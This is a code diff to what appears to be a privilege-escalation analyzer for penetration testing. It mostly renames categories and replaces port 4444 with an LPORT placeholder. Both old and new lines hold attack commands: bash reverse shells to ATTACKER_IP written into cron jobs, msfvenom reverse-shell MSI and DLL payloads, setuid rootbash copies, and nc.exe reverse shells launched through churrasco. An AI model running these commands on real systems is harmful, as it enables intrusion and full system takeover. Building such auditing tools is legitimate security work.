@@ -291,7 +291,7 @@ class Analyzer:
                     technique_name=f"SUID {binary_name} (Unknown)",
                     description="SUID binary not in GTFOBins - may have custom exploitation path",
                     finding=suid.path,
-                    commands=[f"# Investigate: {suid.path}", "strings {suid.path}", "ltrace {suid.path}"],
+                    commands=[f"# Investigate: {suid.path}", f"strings {suid.path}", f"ltrace {suid.path}"],
                     confidence=Confidence.LOW,
                     risk=Risk.LOW,
                     notes="Manual analysis required",
@@ -579,7 +579,7 @@ class Analyzer:
                     finding=f"{cron.schedule} {cron.command}",
                     commands=[
                         f"# Script is writable: {cron.command}",
-                        f"echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> {cron.command}",
+                        f"echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1' >> {cron.command}",
                         "# Or: cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
                     ],
                     confidence=Confidence.HIGH,
@@ -966,7 +966,7 @@ class Analyzer:
         # SeBackupPrivilege
         if "SeBackupPrivilege" in all_privs:
             path = ExploitationPath(
-                category=Category.POTATO,
+                category=Category.TOKEN,
                 technique_name="SeBackupPrivilege Abuse",
                 description="SeBackupPrivilege allows reading any file on the system",
                 finding="SeBackupPrivilege",
@@ -991,7 +991,7 @@ class Analyzer:
         # SeRestorePrivilege
         if "SeRestorePrivilege" in all_privs:
             path = ExploitationPath(
-                category=Category.POTATO,
+                category=Category.TOKEN,
                 technique_name="SeRestorePrivilege Abuse",
                 description="SeRestorePrivilege allows writing to any file on the system",
                 finding="SeRestorePrivilege",
@@ -1014,7 +1014,7 @@ class Analyzer:
         # SeDebugPrivilege
         if "SeDebugPrivilege" in all_privs:
             path = ExploitationPath(
-                category=Category.POTATO,
+                category=Category.TOKEN,
                 technique_name="SeDebugPrivilege Abuse",
                 description="SeDebugPrivilege allows debugging any process including LSASS",
                 finding="SeDebugPrivilege",
@@ -1039,7 +1039,7 @@ class Analyzer:
         # SeLoadDriverPrivilege
         if "SeLoadDriverPrivilege" in all_privs:
             path = ExploitationPath(
-                category=Category.POTATO,
+                category=Category.TOKEN,
                 technique_name="SeLoadDriverPrivilege Abuse",
                 description="SeLoadDriverPrivilege allows loading kernel drivers for code execution",
                 finding="SeLoadDriverPrivilege",
@@ -1064,7 +1064,7 @@ class Analyzer:
         # SeTakeOwnershipPrivilege
         if "SeTakeOwnershipPrivilege" in all_privs:
             path = ExploitationPath(
-                category=Category.POTATO,
+                category=Category.TOKEN,
                 technique_name="SeTakeOwnershipPrivilege Abuse",
                 description="SeTakeOwnershipPrivilege allows taking ownership of any file",
                 finding="SeTakeOwnershipPrivilege",
@@ -1256,7 +1256,7 @@ class Analyzer:
                 finding="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1",
                 commands=[
                     "# Generate malicious MSI:",
-                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi",
+                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f msi -o evil.msi",
                     "# Install MSI:",
                     "msiexec /quiet /qn /i evil.msi"
                 ],
@@ -1429,7 +1429,7 @@ class Analyzer:
                 notes_parts.append(f"PID: {pid}")
 
             path = ExploitationPath(
-                category=Category.CREDENTIALS,
+                category=Category.NETWORK,
                 technique_name=f"Internal Service: {service_name}",
                 description=f"{service_name} bound to {local_addr}:{local_port} - internal only, may have weak auth",
                 finding=f"{local_addr}:{local_port} ({service_name})",
@@ -1511,7 +1511,7 @@ class Analyzer:
                 "description": "World-writable /etc/crontab allows adding malicious cron jobs",
                 "commands": [
                     '# Add reverse shell cron:',
-                    'echo "* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /etc/crontab',
+                    'echo "* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1" >> /etc/crontab',
                     "# Or: echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /etc/crontab"
                 ],
                 "confidence": Confidence.HIGH,
@@ -1809,7 +1809,7 @@ class Analyzer:
                 ge_confidence: Confidence = ge["confidence"]  # type: ignore[assignment]
                 ge_risk: Risk = ge.get("risk", Risk.LOW)  # type: ignore[assignment]
                 path = ExploitationPath(
-                    category=Category.DOCKER,
+                    category=Category.GROUP,
                     technique_name=str(ge["technique"]),
                     description=str(ge["description"]),
                     finding=f"Group membership: {group}",
@@ -1847,13 +1847,13 @@ class Analyzer:
             if binary_dir in writable_dirs:
                 svc_name = getattr(service, 'name', 'Unknown')
                 path = ExploitationPath(
-                    category=Category.SERVICE,
+                    category=Category.DLL,
                     technique_name=f"DLL Hijack: {svc_name}",
                     description=f"Service {svc_name} binary is in writable directory - DLL hijacking possible",
                     finding=f"{svc_name}: {binary_path} (writable dir: {binary_dir})",
                     commands=[
                         "# Generate malicious DLL:",
-                        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll",
+                        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f dll -o hijack.dll",
                         f"# Place DLL in: {binary_dir}",
                         "# Common DLL names to hijack: version.dll, wer.dll, dbghelp.dll",
                         f"copy hijack.dll \"{binary_dir}\\version.dll\"",
@@ -1917,7 +1917,7 @@ class Analyzer:
                 "name": "Chimichurri",
                 "description": "Chimichurri privilege escalation via AFD.sys",
                 "commands": [
-                    "chimichurri.exe ATTACKER_IP 4444"
+                    "chimichurri.exe ATTACKER_IP LPORT"
                 ],
                 "reliability": "medium",
                 "references": ["https://github.com/egre55/windows-kernel-exploits"],
@@ -1958,7 +1958,7 @@ class Analyzer:
                 "commands": [
                     "churrasco.exe \"cmd.exe /c net localgroup administrators USER /add\"",
                     "# Or for reverse shell:",
-                    "churrasco.exe \"nc.exe -e cmd.exe ATTACKER_IP 4444\""
+                    "churrasco.exe \"nc.exe -e cmd.exe ATTACKER_IP LPORT\""
                 ],
                 "reliability": "medium",
                 "references": ["https://github.com/Re4son/Churrasco"],
@@ -2069,7 +2069,7 @@ class Analyzer:
 
         for technique_name, uac_info in uac_techniques.items():
             path = ExploitationPath(
-                category=Category.REGISTRY,
+                category=Category.UAC,
                 technique_name=f"UAC Bypass: {technique_name}",
                 description=str(uac_info["description"]),
                 finding=f"Integrity: {integrity_level or 'Medium (assumed)'}, Admin group: {is_admin}",
